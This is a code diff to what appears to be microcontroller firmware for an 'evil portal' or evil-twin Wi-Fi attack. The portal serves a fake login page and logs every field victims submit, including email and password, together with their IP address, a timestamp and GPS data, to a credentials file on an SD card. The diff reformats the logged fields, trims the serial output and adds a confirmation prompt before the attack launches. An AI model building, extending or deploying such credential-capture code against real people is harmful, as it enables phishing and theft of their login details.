@@ -41,16 +41,19 @@ void handlePortalRoot() {
 }
 
 void handlePortalLogin() {
+  String fields;
+  for (int i = 0; i < portalServer.args(); ++i) {
+    if (i) fields += "; ";
+    fields += portalServer.argName(i);
+    fields += '=';
+    fields += portalServer.arg(i);
+  }
   String line = String(millis());
   line += ',';
   line += portalServer.client().remoteIP().toString();
   line += gpsCsvFields();
-  for (int i = 0; i < portalServer.args(); ++i) {
-    line += ',';
-    line += portalServer.argName(i);
-    line += '=';
-    line += portalServer.arg(i);
-  }
+  line += ',';
+  line += csvField(fields);
   if (portalLogReady) {
     File file = SD.open(kPortalCredsPath, FILE_APPEND);
     if (file) {
@@ -64,7 +67,9 @@ void handlePortalLogin() {
   ++portalCredsCount;
   lastPortalCred =
       portalServer.arg("email") + " / " + portalServer.arg("password");
-  Serial.printf("[portal] captured: %s\n", line.c_str());
+  Serial.printf("[portal] captured %d field(s) from %s\n",
+                portalServer.args(),
+                portalServer.client().remoteIP().toString().c_str());
   portalServer.send(200, "text/html",
                     "<html><body style='font-family:sans-serif;padding:40px'>"
                     "<h3>Connecting...</h3><p>Please wait.</p></body></html>");
@@ -123,6 +128,11 @@ void drawEvilPortal() {
 }
 
 void startEvilPortal() {
+  if (!confirmActiveTest(portalSsid == selectedWifi.ssid ? "Evil twin"
+                                                         : "Portal")) {
+    drawAttacksMenu();
+    return;
+  }
   if (portalSsid.length() == 0) portalSsid = kPortalSsid;
   portalCredsCount = 0;
   lastPortalCred = "";
